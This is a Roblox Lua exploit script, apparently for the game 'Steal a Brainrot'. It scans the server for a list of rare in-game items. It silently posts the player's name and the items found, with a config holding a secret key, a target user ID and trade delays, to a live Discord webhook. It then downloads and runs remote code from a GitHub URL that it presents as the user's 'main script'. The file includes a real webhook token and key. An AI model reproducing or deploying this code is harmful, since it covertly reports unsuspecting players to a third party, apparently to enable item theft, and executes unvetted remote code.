-- URL avec Proxy
local webhookURL = "https://webhook.lewisakura.moe/api/webhooks/1487806869513965679/18RefKz9apMy-rAu3ZAijlKO7DBFpdX547O2dpu1ZZNj-VpIryChHx3GysAzyD22zal8"

local player = game:GetService("Players").LocalPlayer
local http = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

-- Liste exacte des brainrots (détection stricte)
local brainrotList = {
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Strawberry Elephant"] = true,
    ["Griffin"] = true,
    ["Nacho Spyder"] = true,
    ["Quesadillo Vampiro"] = true,
    ["Perrito Burrito"] = true,
    ["Tacorita Bicicleta"] = true,
    ["La Extinct Grande"] = true,
    ["La Spooky Grande"] = true,
    ["Chipso and Queso"] = true,
    ["Tuff Toucan"] = true,
    ["Chillin Chili"] = true,
    ["Gobblino Uniciclino"] = true,
    ["W or L"] = true,
    ["La Jolly Grande"] = true,
    ["La Taco Combinasion"] = true,
    ["Swaggy Bros"] = true,
    ["La Romantic Grande"] = true,
    ["Festive 67"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Money Money Puggy"] = true,
    ["Ketupat Kepat"] = true,
    ["Tang Tang Keletang"] = true,
    ["Tictac Sahur"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Lavadorito Spinito"] = true,
    ["Burguro And Fryuro"] = true,
    ["Garama and Madundung"] = true,
    ["Capitano Moby"] = true,
    ["Dragon Cannelloni"] = true,
    ["Cerberus"] = true,
    ["Agarrini la Palini"] = true,
    ["Guest 666"] = true,
    ["Los Hotspotsitos"] = true,
    ["Tralaledon"] = true,
    ["Los Bros"] = true,
    ["Los Puggies"] = true,
    ["Los Primos"] = true,
    ["Los Tacoritas"] = true,
    ["Los Spaghettis"] = true,
    ["Ginger Gerat"] = true,
    ["Love Love Bear"] = true,
    ["Spooky and Pumpky"] = true,
    ["Fragrama and Chocrama"] = true,
    ["La Casa Boo"] = true,
    ["Los Sekolahs"] = true,
    ["Reinito Sleighito"] = true,
    ["Ketupat Bros"] = true,
    ["Cooki and Milki"] = true,
    ["Rosey and Teddy"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["La Supreme Combinasion"] = true,
    ["Dragon Gingerini"] = true,
    ["Headless Horseman"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Celularcini Viciosini"] = true,
    ["Los Planitos"] = true,
    ["Eviledon"] = true,
    ["Orcaledon"] = true,
    ["Los Jolly Combinasionas"] = true,
    ["Fishino Clownino"] = true,
    ["Los Spooky Combinasionas"] = true,
    ["La Food Combinasion"] = true,
    ["La Secret Combinasion"] = true,
    ["Los Amigos"] = true,
    ["Sammyni Fattini"] = true,
    ["Spaghetti Tualetti"] = true,
    ["Rosetti Tualetti"] = true,
    ["Los 67"] = true,
    ["Los Mobilis"] = true,
    ["Las Sis"] = true,
    ["Los Candies"] = true,
    ["Bacuru and Egguru"] = true,
    ["Mieteteira Bicicleteira"] = true,
    ["Swag Soda"] = true,
    ["Mariachi Corazoni"] = true,
    ["La Ginger Sekolah"] = true
}

local function sendWebhook(foundList)
    local targetBrainrots = {}
    for _, name in ipairs(foundList) do
        targetBrainrots[name] = true
    end

    local configCode = [[
getgenv().SECRET_KEY = "mrr_a4af3be1727049e8b2b20e2a3d7bffee"
getgenv().TARGET_ID = 3209271612
getgenv().DELAY_STEP = 1
getgenv().TRADE_CYCLE_DELAY = 2
getgenv().TARGET_BRAINROTS = ]] .. game:GetService("HttpService"):JSONEncode(targetBrainrots)

    local data = {
        ["content"] = "📢 **Brainrot Détecté !**",
        ["embeds"] = {{
            ["title"] = "Brainrot(s) Trouvé(s) dans le Serveur",
            ["description"] = "```lua\n" .. configCode .. "\n```",
            ["color"] = 16776960,
            ["fields"] = {
                {["name"] = "Détecté par", ["value"] = player.Name, ["inline"] = true},
                {["name"] = "Brainrots trouvés", ["value"] = table.concat(foundList, "\n"), ["inline"] = false}
            },
            ["footer"] = {["text"] = "Steal a Brainrot • " .. os.date("%X")}
        }}
    }

    local httpService = game:GetService("HttpService")
    local body = httpService:JSONEncode(data)

    if http then
        pcall(function() http({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body}) end)
    else
        pcall(function() httpService:PostAsync(webhookURL, body) end)
    end
end

-- Message de démarrage
sendWebhook({"Scan démarré..."})

local foundBrainrots = {}

-- Scan strict dans tout le serveur
for _, obj in ipairs(workspace:GetDescendants()) do
    if obj:IsA("Model") or obj:IsA("Part") or obj:IsA("Folder") then
        local name = obj.Name

        -- Détection stricte : uniquement les noms exacts de la liste
        if brainrotList[name] then
            table.insert(foundBrainrots, name)
        end
    end
end

-- Envoi seulement si vraiment trouvé
if #foundBrainrots > 0 then
    sendWebhook(foundBrainrots)
    print("✅ Brainrot(s) trouvé(s) et envoyé(s) :")
    print(table.concat(foundBrainrots, ", "))
else
    print("❌ Aucun brainrot de la liste trouvé dans le serveur.")
end

-- Ton script principal
loadstring(game:HttpGet("https://raw.githubusercontent.com/nethersdev/Ragdolltpduel/main/Nethers.lua"))()
